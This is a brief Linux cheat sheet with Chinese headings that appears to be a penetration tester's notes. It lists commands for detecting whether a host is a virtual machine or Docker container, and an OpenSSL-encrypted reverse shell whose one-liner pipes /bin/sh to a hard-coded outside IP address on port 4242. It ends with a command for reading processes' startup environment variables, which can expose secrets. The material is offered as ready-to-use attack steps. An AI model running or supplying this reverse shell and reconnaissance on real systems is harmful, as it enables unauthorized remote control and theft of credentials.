# Linux

## 查看是否是虚拟机
lshw -class system | grep -i VM & grep -i virtual
dmesg | grep -i VM & grep -i virtual
dmidecode -s system-product-name
ls /tmp
systemd-detect-virt
virt-what
ls -alh /.dockerenv
cat /proc/1/cgroup




## openssl 回弹shell

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 4242

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 1.117.43.77:4242 > /tmp/s; rm /tmp/s
```

## 查看启动时的环境变量

```bash
cat /proc/$PID/environ


例如： /proc/1/environ
```




